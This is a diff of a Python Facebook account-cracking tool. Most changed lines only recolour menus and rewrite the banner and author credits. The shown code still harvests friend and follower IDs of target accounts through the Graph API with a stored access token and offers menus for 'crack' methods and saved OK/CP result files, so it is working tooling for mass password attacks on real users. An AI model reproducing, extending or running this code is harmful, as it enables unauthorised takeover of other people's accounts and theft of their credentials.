@@ -53,28 +53,20 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 
 def logo():
 	os.system("clear")
-	print("""\x1b[0;32m
-
-███████╗██╗   ██╗███████╗ ██████╗  ██████╗ 
-
-██╔════╝██║   ██║██╔════╝██╔════╝ ██╔═══██╗
-█████╗  ██║   ██║█████╗  ██║  ███╗██║   ██║
-
-██╔══╝  ██║   ██║██╔══╝  ██║   ██║██║   ██║
-
-██║     ╚██████╔╝███████╗╚██████╔╝╚██████╔╝
-
-╚═╝      ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ 
-
+	print("""\x1b[0;32m███████╗██╗   ██╗███████╗ ██████╗  ██████╗ 
+\x1b[1;33m██╔════╝██║   ██║██╔════╝██╔════╝ ██╔═══██╗
+\x1b[1;33m█████╗  ██║   ██║█████╗  ██║  ███╗██║   ██║
+\x1b[1;33m██╔══╝  ██║   ██║██╔══╝  ██║   ██║██║   ██║
+\x1b[1;33m██║     ╚██████╔╝███████╗╚██████╔╝╚██████╔╝
+\x1b[1;33m╚═╝      ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ 
                                            
 
-═══════════════════╝
 \x1b[0;33m ---------------------------------------------
 \x1b[0;33m╔════════════════════════════════════════════╗
-\x1b[0;33m║#YOUTUBE : https://youtube.com/SocialTech.  ║
-\x1b[0;33m║#FACEBOOK : [ Fue Go ].                                         ║
-\x1b[0;33m║#GITHUB :  MAFIA-FUEGO.                                    ║
-\x1b[0;33m║#WHATSAPP : +27768432399.                   ║
+\x1b[0;33m║Author : FUE GO
+\x1b[0;33m║Coded by : MAFIA TEAM                       
+\x1b[0;33m║Version : 3.0 v                                 
+\x1b[0;33m║Contact me on Facebook : Fue Go              
 \x1b[0;33m╚════════════════════════════════════════════╝""")
 def login():
 	os.system("clear")
@@ -117,13 +109,13 @@ def menu():
 		exit(" ! no internet connection")
 	logo()
 	
-	print("\n\032[1;32m[\032[1;94m01\033[1;32m] Crack from public friends")
-	print("\032[1;32m[\032[1;94m02\032[1;32m] Crack from public followers")
-	print("\032[1;32m[\032[1;94m03\033[1;97m] Multi-ID cracking\033[1;32m [ \033[1;32mPRO \033[1;97m]")
-	print("\032[1;93m[\032[1;94m04\033[1;97m] check crack results")
-	print("\032[1;93m[\032[1;94m05\033[1;97m] User-agent settings\033[1;97m [ \033[1;95mPRO \033[1;97m]")
-	print("\032[1;93m[\032[1;94m00\033[1;97m] Exit\033[1;97m [ \033[1;91mDelete token \033[1;97m]")
-	Bilal = raw_input("\n\032[1;97m[\033[1;97m+\033[1;97m] Choose : ")
+	print("\n\033[1;32m[\033[1;32m01\033[1;32m] Crack from public friends")
+	print("\033[1;32m[\033[1;32m02\033[1;32m] Crack from public followers")
+	print("\033[1;32m[\033[1;32m03\033[1;33m] Crack from Multi-ID's \033[1;93m [ \033[1;31mPRO \033[1;97m]")
+	print("\033[1;32m[\033[1;32m04\033[1;32m] Chack Crack Results")
+	print("\033[1;32m[\033[1;32m05\033[1;32m] USER-AGENT SETTINGS\033[1;97m [ \033[1;95mPRO \033[1;97m]")
+	print("\033[1;32m[\033[1;32m00\033[1;32m] Exit\033[1;32m [ \033[1;33mDELETE TOKEN \033[1;97m]")
+	Bilal = raw_input("\n\033[1;32m[\033[1;32m+\033[1;33m] CHOOSE : ")
 	if Bilal =="":
 		menu()
 	elif Bilal == "1" or Bilal == "01":
@@ -136,9 +128,9 @@ def menu():
 		massal()
 		method()
 	elif Bilal == "4" or Bilal == "04":
-		print("\n\033[1;92m[\033[1;93m01\033[1;96m] Check crack results OK")
-		print("\033[1;93m[\033[1;94m02\033[1;96m] Check crack results CP")
-		cek = raw_input("\n\033[1;93m[\033[1;93m+\033[1;96m] Choose : ")
+		print("\n\033[1;32m[\033[1;32m01\033[1;32m] Check crack results OK")
+		print("\033[1;32m[\033[1;32m02\033[1;32m] Check crack results CP")
+		cek = raw_input("\n\033[1;33m[\033[1;33m+\033[1;33m] Choose : ")
 		if cek =="":
 			menu()
 		elif cek == "1":
@@ -156,17 +148,17 @@ def menu():
 			nm_file = ("%s"%(file)).replace("-", " ")
 			del_txt = nm_file.replace(".txt", "")
 			print(" # ----------------------------------------------")
-			print(" Crack Resulte : %s Total : %s\033[0;92m"%(del_txt, len(Totalok)))
+			print(" Crack Result : %s Total : %s\033[1;34m"%(del_txt, len(Totalok)))
 			os.system("cat OK/%s"%(file))
-			print(" \033[0;94m # ----------------------------------------------")
+			print(" \033[0;32m # ----------------------------------------------")
 			exit(" ")
 		elif cek == "2":
 			dirs = os.listdir("CP")
-			print("\033[1;96m[\033[1;93m+\033[1;96m] Copy File Name And Past into Input")
+			print("\033[1;32m[\033[1;32m+\033[1;32m] Copy file name and past into Input")
 			for file in dirs:
 				print(" + "+file)
 			try:
-				file = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] File Name : ")
+				file = raw_input("\n\033[1;32m[\033[1;32m+\033[1;32m] File Name : ")
 				if file == "":
 					menu()
 				Totalcp = open("CP/%s"%(file)).read().splitlines()
@@ -175,9 +167,9 @@ def menu():
 			nm_file = ("%s"%(file)).replace("-", " ")
 			del_txt = nm_file.replace(".txt", "")
 			print("# ----------------------------------------------")
-			print(" Crack results : %s Total : %s\033[0;93m"%(del_txt, len(Totalcp)))
+			print(" Crack results : %s Total : %s\033[0;32m"%(del_txt, len(Totalcp)))
 			os.system("cat CP/%s"%(file))
-			print("\033[0;96m # ----------------------------------------------")
+			print("\033[0;32m # ----------------------------------------------")
 			exit(" ")
 		else:
 			menu()
@@ -185,7 +177,7 @@ def menu():
 		setting_ua()
 	elif Bilal == "0" or Bilal == "00":
 		os.system("rm -f login.txt")
-		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Removed")
+		exit("\n\033[1;31m[\033[1;31m!\033[1;31m] Token Removed")
 	else:
 		menu()
 
@@ -194,7 +186,7 @@ def publik():
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Error")
+		exit("\n\033[1;31m[\033[1;31m!\033[1;31m] Token Error")
 	idt = raw_input("\n\033[1;96m[\033[1;94m+\033[1;96m] Target Id: ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
@@ -202,15 +194,15 @@ def publik():
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Account Friend List is Not Public")
-	print("\033[1;96m[\033[1;94m+\033[1;96m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
+		exit("\n\033[1;31m[\033[1;31m+\033[1;31m] Account Friend List is Not Public")
+	print("\033[1;31m[\033[1;31m+\033[1;31m] Total id  : \033[0;31m%s\033[0;31m"%(len(id))) 
 
 def follower():
 	global token
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
+		exit("\n\033[1;31m[\033[1;31m+\033[1;31m] Token Error")
 	idt = raw_input("\n\033[1;96m[\033[1;94m+\033[1;96m] Target ID : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
@@ -219,35 +211,35 @@ def follower():
 			id.append(uid+"<=>"+nama)
 	except KeyError:
 		exit("URL Error")
-	print("[+] Total id  : \033[0;92m%s\033[0;96m"%(len(id))) 
+	print("[+] Total id  : \033[0;33m%s\033[0;33m"%(len(id))) 
 
 def massal():
 	global token
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
+		exit("\033[1;31m[\033[1;31m+\033[1;31m] Token Error")
 	try:
-		tanya_Total = int(input("\033[1;96m[\033[1;94m+\033[1;96m] Enter Multi crack number [option] : "))
+		tanya_Total = int(input("\033[1;33m[\033[1;33m+\033[1;33m] Enter Multi crack number [option] : "))
 	except:tanya_Total=1
 	for t in range(tanya_Total):
 		t +=1
-		idt = raw_input("\033[1;96m[\033[1;94m+\033[1;97m] Target ID %s : "%(t))
+		idt = raw_input("\033[1;31m[\033[1;31m+\033[1;31m] Target ID %s : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
 				nama = i["name"].rsplit(" ")[0]
 				id.append(uid+"<=>"+nama)
 		except KeyError:
-			print("\033[1;96m[\033[1;94m+\033[1;97m] Ids Friend list Is Not Public")
-	print("\033[1;96m[\033[1;94m?\033[1;97m] Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
+			print("\033[1;31m[\033[1;31m+\033[1;31m] Ids Friend list Is Not Public")
+	print("\033[1;33m[\033[1;33m?\033[1;33m] Total id  : \033[0;33m%s\033[0;33m"%(len(id)))
 
 def method():
-	print("\n\033[1;93m[\033[1;94m?\033[1;97m] Pick cracking methord")
-	print("\033[1;93m[\033[1;94m1\033[1;97m] B-api\033[1;97m [ \033[1;95mPRO/Faster\033[1;97m]")
-	print("\033[1;93m[\033[1;94m2\033[1;97m] Mbasic\033[1;93m [ \033[1;95mFast\033[1;97m]")
-	print("\033[1;93m[\033[1;94m3\033[1;97m] Free Facebook\033[1;93m [ \033[1;95mNormal\033[1;97m]")
-	method = raw_input("\033[1;93m[\033[1;94m?\033[1;97m] Pick cracking methord : ")
+	print("\n\033[1;33m[\033[1;33m?\033[1;33m] Pick cracking methord")
+	print("\033[1;32m[\033[1;32m1\033[1;32m] B-api\033[1;31m [ \033[1;31mPRO/Faster\033[1;31m]")
+	print("\033[1;32m[\033[1;32m2\033[1;32m] Mbasic\033[1;31m [ \033[1;31mFast\033[1;31m]")
+	print("\033[1;32m[\033[1;32m3\033[1;32m] Free Facebook\033[1;32m [ \033[1;31mNormal\033[1;m]")
+	method = raw_input("\033[1;32m[\033[1;32m?\033[1;32m] Pick cracking methord : ")
 	if method == "":
 		menu()
 	elif method == "1":
